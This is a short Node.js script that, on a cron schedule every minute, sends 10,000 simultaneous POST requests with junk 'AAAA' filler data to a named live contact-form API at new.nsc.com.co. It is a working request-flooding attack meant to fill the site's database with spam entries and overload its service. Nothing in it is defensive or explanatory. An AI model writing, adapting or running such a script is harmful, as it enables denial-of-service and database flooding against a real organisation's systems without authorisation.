const axios = require("axios");
const cron = require("node-cron");
const data = {
  data: {
    email: "aaaaa@aaa.aa",
    message:
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ",
    name: "AAAAA",
    phone: "AAAAAA",
    subject: "AAAAA",
  },
};

const makeReqs = async () => {
  try {
    const proms = [];
    for (let i = 0; i < 10000; i++) {
      proms.push(
        new Promise((a, r) => {
          axios
            .post("https://new.nsc.com.co/api/contact/add", data)
            .then((resp) => {
              // console.log(resp?.data?.result?.insertId);
              a();
            })
            .catch(() => r());
        })
      );
    }
    Promise.allSettled(proms);
    setTimeout(() => Promise.allSettled(proms), 30000);
  } catch (e) {
    console.log(e);
  }
};

cron.schedule("* * * * *", function () {
  console.log("running script");
  makeReqs();
});
